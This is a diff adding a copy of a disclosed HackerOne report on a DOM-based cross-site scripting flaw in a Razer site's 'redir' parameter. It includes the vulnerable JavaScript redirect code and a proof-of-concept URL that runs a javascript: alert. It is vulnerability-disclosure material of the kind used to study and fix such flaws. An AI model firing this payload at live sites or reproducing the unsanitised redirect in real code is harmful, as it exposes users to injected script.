@@ -1,0 +1,43 @@
+ReportLink:https://hackerone.com/reports/266737
+WeaknessName:Cross-site Scripting (XSS) - DOM
+Reporter:https://hackerone.com/edoverflow
+ReportedTo:Razer US(razer_us)
+BountyAmount:
+Severity:high
+State:Closed
+DateOfDisclosure:08.11.2017 19:39:35
+
+Summary:
+
+# Summary
+---
+
+zvault.razerzone.com is vulnerable to DOM-based XSS via the `redir` parameter.
+
+{F219081}
+
+{F219082}
+
+# Affected Code
+---
+
+```js
+var redirectUrl = getUrlParameter('redir');
+
+if (isCrossOriginFrame()) {
+    window.location.href = redirectUrl;
+} else {
+    window.parent.location.href = redirectUrl;
+}
+```
+
+# Browsers Verified In
+---
+
+* Google Chrome 60.0.3112.113 (Official Build) (64-bit)
+* Mozilla Firefox 55.0.2 (64-bit)
+
+# PoC
+---
+
+https://zvault.razerzone.com/redir.html?redir=javascript:alert(document.domain)
